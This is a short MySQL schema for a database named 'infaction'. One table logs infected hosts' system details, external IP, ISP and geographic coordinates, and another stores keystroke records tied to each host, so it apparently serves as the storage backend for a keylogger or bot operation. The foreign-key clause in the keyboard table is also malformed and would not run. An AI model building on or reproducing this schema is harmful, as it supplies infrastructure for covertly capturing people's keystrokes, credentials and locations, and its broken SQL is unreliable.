CREATE DATABASE IF NOT EXISTS `infaction` /*!40100 DEFAULT CHARACTER SET utf8 */;
USE `infaction`;

CREATE TABLE IF NOT EXISTS `machine` (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
  `user` varchar(30) NOT NULL COMMENT '系统用户',
  `version` varchar(20) NOT NULL COMMENT '系统版本',
  `version_info` varchar(100) NOT NULL COMMENT '系统信息',
  `uptime` int(5) NOT NULL DEFAULT  0 COMMENT '运行时间',
  `cpu` int(5) NOT NULL DEFAULT  0 COMMENT 'cpu逻辑核数',
  `memory` int(5) NOT NULL DEFAULT  0 COMMENT '内存MB',
  `disk` varchar (50) NOT NULL COMMENT '硬盘信息',
  `netcard` varchar (100) NOT NULL COMMENT '网卡信息',
  `oip` varchar (20) NOT NULL COMMENT '外网IP',
  `isp` varchar (10) NOT NULL COMMENT '运营商',
  `lon` double(10,6) NOT NULL COMMENT '经度',
  `lat` double(10,6) NOT NULL COMMENT '纬度',
  `down` int (5) NOT NULL COMMENT '下行',
  `up` int (5) NOT NULL COMMENT '上行',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

CREATE TABLE IF NOT EXISTS `keyboard` (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
  `hit` varchar(255) NOT NULL COMMENT '敲击记录',
  `user` int(10)  not null COMMENT '关联用户' ,
  constraint user_id foreign key keyboard('user') references machine('id')
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;